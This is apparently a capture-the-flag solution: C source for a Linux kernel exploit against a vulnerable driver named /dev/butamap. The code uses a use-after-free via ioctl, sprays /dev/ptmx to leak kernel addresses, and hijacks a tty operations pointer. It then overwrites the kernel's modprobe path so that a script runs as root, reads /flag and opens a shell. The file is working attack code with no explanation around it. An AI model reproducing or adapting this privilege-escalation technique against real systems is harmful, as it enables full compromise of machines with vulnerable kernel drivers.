#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <termios.h>

typedef struct param{
    size_t idx;
    size_t size;
    char *buf;
} param;

int spray[0x200];

unsigned long user_cs, user_ss, user_rflags, user_sp, user_rip;
unsigned long leak, kbase, kleak, buf, payload, probe;

void modprobe_trigger(void) {
    printf("[+] Back to userland safely! here is the leaks\n");
    printf("[+] Modprobe at 0x%llx\n", kleak);
    system("echo '#!/bin/sh\nchmod 777 /flag' > /t/x");
    system("chmod +x /t/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /t/dummy");
    system("chmod +x /t/dummy");
    system("/t/dummy");
    printf("[+] Profit \n");
    system("cat /flag");
    system("sh");
}

void shell(void){

	while(1){
		asm(
			"xor r10, r10;"
			"xor r8, r8;"
			"mov r8, kleak;"
			"mov r10, qword ptr[r8];"
			"mov probe, r10;"
		);
		if(probe == 0x6f6d2f6e6962732f){ // compare if address is equal to first 8byte of /sbin/modprobe
		    asm("xor rax, rax;"
		        "xor rbx, rbx;"
		        "xor r15, r15;"
		        "mov rax, 0x0000782f742f;" // /tmp/x
		        "mov rbx, kleak;" // the modprobe path
		        "mov qword ptr [rbx], rax;" // set the path of modprobe to /tmp/x
		        "swapgs;"
		        "mov r15, user_ss;"
		        "push r15;"
		        "mov r15, user_sp;"
		        "push r15;"
		        "mov r15, user_rflags;"
		        "push r15;"
		        "mov r15, user_cs;"
		        "push r15;"
		        "mov r15, user_rip;"
		        "push r15;"
		        "iretq;"
		        );
		} //if 
		else{
			kleak += 1;
		}
	} //while
  
}

void prepare_tf(void) {
    asm("mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    user_rip = (unsigned long)modprobe_trigger;
}

void ppause(){
	puts("enter to unpause");
	getchar();
}


int main(){
	param heap;
	prepare_tf();
	int fd = open("/dev/butamap", O_RDWR);
	if (fd == - 1){
		puts("gabisa di buka ngab");
	}
	// leak setup & leak 101
	heap.idx = 0;
	heap.size = 0x300;
	heap.buf = malloc(0x300);

	// UAF GET LEAK
	ioctl(fd, 0x1770, (unsigned long)&heap);
	ioctl(fd, 0x1773, (unsigned long)&heap);

	ioctl(fd, 0x1771, (unsigned long)&heap);

	for (int i = 0; i < 50; i++) {
		spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    		if (spray[i] == -1){ 
			printf("fail to open %d\n", i);
  		}
	}
	ioctl(fd, 0x1772, (unsigned long)&heap);
	
	for(int i = 0; i < 0x500; i +=8){
		printf("[+] idx %d 0x%llx\n", i, *(long long *) (heap.buf+i));
	}

	leak = *(long long *) (heap.buf+24);
	kleak = leak+0x300000L; // selamat dukun disini
	buf = *(long long *) (heap.buf+56) - 0x38;
	payload = (unsigned long) shell;
   	printf("[+] ptmx Leaked 0x%llx\n", leak);
	printf("[+] heap base pointer 0x%llx\n", buf);
	printf("[+] start to enum target calculated eaked 0x%llx\n", kleak);
	*(long long *) (heap.buf+0x2f8) = payload;
	printf("[+] Wrote gadget to  0x%llx\n", buf+0x2f8);

	ioctl(fd, 0x1773, (unsigned long)&heap);

	heap.idx = 0;
	ioctl(fd, 0x1770, (unsigned long)&heap);
	ioctl(fd, 0x1773, (unsigned long)&heap);
	ioctl(fd, 0x1771, (unsigned long)&heap);

	memset(heap.buf, 0, 0x300);
	for (int i = 50; i < 200; i++) {
                spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                if (spray[i] == -1){
                        printf("fail to open %d\n", i);
                }
        }
    	ioctl(fd, 0x1772, (unsigned long)&heap);

	*(long long *) (heap.buf+24) = buf + 0x2f8-96;

	printf("[+] Changing ptmx to 0x%llx\n", *(long long *) (heap.buf+24));

	ioctl(fd, 0x1773, (unsigned long)&heap);

	for (int i = 0; i < 200; i++) {
		ioctl(spray[i], 0, 0);
    }

}
